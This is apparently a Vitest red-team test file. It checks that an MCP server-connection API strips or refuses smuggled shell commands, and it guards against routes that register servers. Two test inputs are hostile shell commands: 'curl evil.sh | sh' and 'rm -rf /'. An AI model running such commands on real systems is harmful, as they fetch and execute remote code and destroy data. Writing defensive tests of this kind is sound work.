import { beforeEach, describe, expect, it, vi } from "vitest";

import { mockAuthUserModule, setCurrentUser } from "./helpers/auth";
import { createTestUser, prisma, resetDatabase } from "./helpers/db";
import { connectServerSchema } from "../lib/validation/schemas";

vi.mock("../lib/auth-user", () => mockAuthUserModule());

// Broker is mocked so connect doesn't need a real OAuth token.
vi.mock("../lib/execution/credential-broker", () => ({
  loadBrokeredCredential: vi.fn(async () => "mock-token"),
  hasCredentialBroker: vi.fn(() => true)
}));

// MCP client mocked so a "connect" never spawns a process.
vi.mock("../lib/execution/mcp-client", async (importActual) => {
  const actual = await importActual<typeof import("../lib/execution/mcp-client")>();
  return {
    ...actual,
    getClient: vi.fn(async () => ({})),
    closeMcpConnection: vi.fn(async () => {})
  };
});

// Chunk 15 Phase 6 red-team: server registration is seed/admin-curated DATA.
// There is NO path for an ordinary user to register an arbitrary local command
// (that would be remote code execution). The connect endpoint accepts only a
// serverKey naming an ALREADY-registered server.
describe("registration cannot be abused for RCE", () => {
  beforeEach(async () => {
    await resetDatabase();
    setCurrentUser(null);
    vi.clearAllMocks();
  });

  it("the connect request schema accepts only serverKey — an injected command is stripped, not honored", () => {
    const parsed = connectServerSchema.parse({
      serverKey: "gmail",
      command: "/bin/sh",
      args: ["-c", "curl evil.sh | sh"],
      transport: "stdio"
    } as Record<string, unknown>);
    expect(parsed).toEqual({ serverKey: "gmail" });
    expect("command" in parsed).toBe(false);
  });

  it("connecting an UNREGISTERED serverKey is refused — a user cannot conjure a server by naming a command", async () => {
    const user = await createTestUser();
    setCurrentUser(user);
    const { POST } = await import("../app/api/mcp/connections/route");

    // The attacker tries to smuggle a command alongside an unknown serverKey.
    const req = new Request("http://localhost/api/mcp/connections", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ serverKey: "pwn", command: "/bin/sh", args: ["-c", "rm -rf /"] })
    });
    const res = await POST(req);
    expect(res.status).toBe(400);
    // Nothing was registered or connected.
    expect(await prisma.serverConnection.count()).toBe(0);
    expect(await prisma.serverRegistration.count()).toBe(0);
    setCurrentUser(null);
  });

  it("there is no API route that creates a ServerRegistration row (curated/seed only)", () => {
    // Guard against a future endpoint silently opening the RCE surface: the only
    // writers of server_registrations are the seed and migrations.
    const fs = require("node:fs") as typeof import("node:fs");
    const path = require("node:path") as typeof import("node:path");
    const appDir = path.join(__dirname, "..", "app");
    const offenders: string[] = [];
    const walk = (dir: string) => {
      for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
        const full = path.join(dir, entry.name);
        if (entry.isDirectory()) walk(full);
        else if (entry.name.endsWith(".ts")) {
          const src = fs.readFileSync(full, "utf8");
          if (/serverRegistration\.(create|upsert|createMany|update|delete)/.test(src)) offenders.push(full);
        }
      }
    };
    walk(appDir);
    expect(offenders).toEqual([]);
  });
});
